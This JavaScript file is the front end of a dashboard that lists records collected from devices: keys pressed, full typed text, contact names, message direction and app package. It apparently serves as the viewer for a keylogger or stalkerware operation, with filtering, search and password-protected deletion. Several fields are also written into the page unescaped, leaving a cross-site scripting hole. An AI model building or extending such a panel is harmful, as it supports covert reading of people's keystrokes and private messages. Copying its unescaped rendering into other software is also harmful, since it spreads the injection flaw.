const recordsBody = document.getElementById("recordsBody");
const deviceFilter = document.getElementById("deviceFilter");
const searchInput = document.getElementById("searchInput");
const limitFilter = document.getElementById("limitFilter");
const totalRecords = document.getElementById("totalRecords");
const totalDevices = document.getElementById("totalDevices");
const lastUpdated = document.getElementById("lastUpdated");
const refreshBtn = document.getElementById("refreshBtn");
const clearAllBtn = document.getElementById("clearAllBtn");
const prevPageBtn = document.getElementById("prevPageBtn");
const nextPageBtn = document.getElementById("nextPageBtn");
const pageInfo = document.getElementById("pageInfo");

let currentPage = 1;
let totalPages = 1;
let searchTimer = null;

function formatDate(value) {
  return new Date(value).toLocaleString();
}

function askAdminPassword(actionLabel) {
  const password = window.prompt(`Enter admin password to ${actionLabel}:`);
  if (password === null) return null;
  if (!password.trim()) {
    alert("Password is required.");
    return null;
  }
  return password.trim();
}

function directionLabel(direction, action) {
  if (direction === "incoming" || action === "incoming") return "Incoming";
  if (direction === "outgoing" || action === "reply") return "Outgoing";
  return direction || "—";
}

function renderRecords(records) {
  if (!records.length) {
    recordsBody.innerHTML = '<tr><td colspan="10" class="empty">No records found.</td></tr>';
    return;
  }

  recordsBody.innerHTML = records
    .map(
      (record) => `
      <tr>
        <td class="mono">${record.recordId}</td>
        <td class="mono">${record.deviceUniqueId}</td>
        <td>${escapeHtml(record.keyPressed)}</td>
        <td>${escapeHtml(record.fullText || "")}</td>
        <td>${escapeHtml(record.contactName || "—")}</td>
        <td><span class="badge">${escapeHtml(directionLabel(record.direction, record.action))}</span></td>
        <td class="mono">${record.appPackage || "unknown"}</td>
        <td><span class="badge">${record.action || "key"}</span></td>
        <td>${formatDate(record.createdAt)}</td>
        <td>
          <button
            class="btn small delete-row"
            data-record-id="${record.recordId}"
            title="Delete this record"
          >
            Delete
          </button>
        </td>
      </tr>
    `
    )
    .join("");
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function updatePaginationControls() {
  pageInfo.textContent = `Page ${currentPage} of ${totalPages}`;
  prevPageBtn.disabled = currentPage <= 1;
  nextPageBtn.disabled = currentPage >= totalPages;
}

async function loadDevices() {
  const response = await fetch("/api/devices");
  const result = await response.json();
  const current = deviceFilter.value;

  deviceFilter.innerHTML = '<option value="">All devices</option>';
  result.data.forEach((device) => {
    const option = document.createElement("option");
    option.value = device.deviceUniqueId;
    option.textContent = `${device.deviceUniqueId.slice(0, 8)}... (${device.count})`;
    deviceFilter.appendChild(option);
  });

  deviceFilter.value = current;
  totalDevices.textContent = result.data.length;
}

async function loadRecords() {
  const limit = limitFilter.value;
  const deviceId = deviceFilter.value;
  const search = searchInput.value.trim();
  const query = new URLSearchParams({
    limit,
    page: String(currentPage),
  });

  if (deviceId) {
    query.set("deviceUniqueId", deviceId);
  }
  if (search) {
    query.set("search", search);
  }

  const response = await fetch(`/api/records?${query.toString()}`);
  const result = await response.json();

  currentPage = result.page || 1;
  totalPages = result.totalPages || 1;
  totalRecords.textContent = result.total;
  lastUpdated.textContent = new Date().toLocaleTimeString();
  updatePaginationControls();
  renderRecords(result.data || []);
}

async function refreshDashboard(resetPage = false) {
  if (resetPage) {
    currentPage = 1;
  }
  recordsBody.innerHTML = '<tr><td colspan="10" class="empty">Loading records...</td></tr>';
  await Promise.all([loadDevices(), loadRecords()]);
}

async function deleteRecord(recordId) {
  const password = askAdminPassword("delete this record");
  if (!password) return;

  if (!confirm("Delete this record?")) {
    return;
  }

  const response = await fetch(`/api/records/${encodeURIComponent(recordId)}`, {
    method: "DELETE",
    headers: {
      "x-admin-password": password,
    },
  });
  const result = await response.json();

  if (!response.ok || !result.success) {
    alert(result.message || "Failed to delete record");
    return;
  }

  await refreshDashboard();
}

async function clearAllRecords() {
  const password = askAdminPassword("clear data");
  if (!password) return;

  const deviceId = deviceFilter.value;
  const message = deviceId
    ? "Delete all records for the selected device?"
    : "Delete ALL records from the database? This cannot be undone.";

  if (!confirm(message)) {
    return;
  }

  const query = deviceId ? `?deviceUniqueId=${encodeURIComponent(deviceId)}` : "";
  const response = await fetch(`/api/records${query}`, {
    method: "DELETE",
    headers: {
      "x-admin-password": password,
    },
  });
  const result = await response.json();

  if (!response.ok || !result.success) {
    alert(result.message || "Failed to clear records");
    return;
  }

  alert(`Deleted ${result.deletedCount} record(s).`);
  await refreshDashboard(true);
}

refreshBtn.addEventListener("click", () => refreshDashboard());
clearAllBtn.addEventListener("click", clearAllRecords);

deviceFilter.addEventListener("change", () => {
  currentPage = 1;
  loadRecords();
});

limitFilter.addEventListener("change", () => {
  currentPage = 1;
  loadRecords();
});

searchInput.addEventListener("input", () => {
  clearTimeout(searchTimer);
  searchTimer = setTimeout(() => {
    currentPage = 1;
    loadRecords();
  }, 300);
});

prevPageBtn.addEventListener("click", () => {
  if (currentPage <= 1) return;
  currentPage -= 1;
  loadRecords();
});

nextPageBtn.addEventListener("click", () => {
  if (currentPage >= totalPages) return;
  currentPage += 1;
  loadRecords();
});

recordsBody.addEventListener("click", (event) => {
  const button = event.target.closest("[data-record-id]");
  if (!button) return;
  deleteRecord(button.dataset.recordId);
});

refreshDashboard(true);
